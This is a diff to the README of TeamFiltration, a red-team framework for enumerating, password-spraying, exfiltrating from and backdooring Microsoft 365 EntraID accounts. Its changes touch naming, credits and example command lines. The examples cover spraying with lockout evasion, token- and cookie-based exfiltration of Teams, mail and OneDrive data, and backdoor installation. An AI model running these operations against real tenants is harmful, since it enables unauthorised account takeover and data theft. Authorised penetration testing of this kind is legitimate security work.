@@ -5,10 +5,10 @@
 
 ## TeamFiltration
 
-TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts.
+TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 EntraID accounts.
 See the [TeamFiltration](https://github.com/Flangvik/TeamFiltration/wiki/Home) wiki page for an introduction into how TeamFiltration works and the [Quick Start  Guide](https://github.com/Flangvik/TeamFiltration/wiki/Home#quick-start-guide) for how to get up and running!
 
-This tool has been used internally while working at TrustedSec since January 2021 and was publicly released in my talk [Taking a Dump In The Cloud](https://youtu.be/GpZTQHLKelg) during DefCON30.
+This tool has been used internally at TrustedSec since January 2021 and was publicly released in my talk [Taking a Dump In The Cloud](https://youtu.be/GpZTQHLKelg) during DefCON30.
 
 ## Download
 [You can download the latest precompiled release for Linux, Windows and MacOS ](https://github.com/Flangvik/TeamFiltration/releases/latest)   
@@ -46,7 +46,7 @@ This tool has been used internally while working at TrustedSec since January 202
  └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╝
    ╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝
 
-[❤] TeamFiltration V3.5.5 PUBLIC, created by @Flangvik at @KovertNO, @TrustedSec
+[❤] TeamFiltration V3.5.5 PUBLIC, created by @Flangvik at @TrustedSec
 [+] Args parsed 
 Usage:
 
@@ -112,18 +112,18 @@ Usage:
 
    Examples:
 
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\CookieData.txt --all
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --exfil --aad 
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --exfil --tokens C:\\OutputTokens.txt --onedrive --owa
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --backdoor
-        --outpath C:\Clients\2024\FooBar\TFOutput --config myCustomConfig.json --database
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\FooBar\Exclude_Emails.txt
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --exfil --cookie-dump C:\\CookieData.txt --all
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --exfil --aad 
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --exfil --tokens C:\\OutputTokens.txt --onedrive --owa
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --enum --validate-onedrive --domain example.com
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\FooBar\OSINT\Usernames.txt
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --backdoor
+        --outpath C:\Clients\FooBar\TFOutput --config myCustomConfig.json --database
 
 ```
 
@@ -134,4 +134,5 @@ Usage:
 - [WS API Gateway management tool for creating on the fly HTTP pass-through proxies for unique IP rotation](https://github.com/ustayready/fireprox)
 - Credits to [Ryan](https://twitter.com/detectdotdev) for validating and discussing my observations / questions!
 - The entire [TrustedSec](https://TrustedSec.com) team for helping me polish this tool! 
+- The OneDrive enumeration method found by @nyxgeek and script [onedrive_user_enum](https://github.com/nyxgeek/onedrive_user_enum)
 
